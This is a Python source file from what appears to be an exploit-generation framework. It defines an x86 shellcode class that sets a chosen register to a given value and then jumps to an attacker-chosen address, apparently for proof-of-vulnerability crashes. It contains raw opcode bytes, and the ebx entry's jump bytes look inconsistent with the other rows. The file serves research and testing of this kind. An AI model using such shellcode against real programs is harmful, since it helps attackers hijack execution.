import claripy
import logging
from rex.exploit.shellcode import Shellcode

l = logging.getLogger("rex.exploit.shellcodes.cgc_x86_setregister")

class X86SetRegister(Shellcode):

    supported_platforms = ["cgc", "unix"]

    arch = "X86"

    name = "setregister"

    codes = {
            'eax': ["\xb8", "\xbb", "\xff\xe3"],
            'ebx': ["\xbb", "\xb8", "\xff\xee"],
            'ecx': ["\xb9", "\xbb", "\xff\xe3"],
            'edx': ["\xba", "\xbb", "\xff\xe3"],
            'edi': ["\xbf", "\xbb", "\xff\xe3"],
            'esi': ["\xbe", "\xbb", "\xff\xe3"],
            'esp': ["\xbc", "\xbb", "\xff\xe3"],
            'ebp': ["\xbd", "\xbb", "\xff\xe3"],
            }

    def to_raw(self, register, value, ip):
        '''
        :param register: register to set
        :param value: value to set register to
        :param ip: ip value to crash at
        '''

        if isinstance(value, (int, long)):
            value = claripy.BVV(value, 32)
        if isinstance(ip, (int, long)):
            ip = claripy.BVV(ip, 32)

        code_row = None
        try:
            code_row = map(claripy.BVV, self.codes[register])
        except KeyError:
            raise ValueError("register '%s' does not exist" % register)

        return claripy.Concat(code_row[0], value.reversed, code_row[1], ip.reversed,  code_row[2])
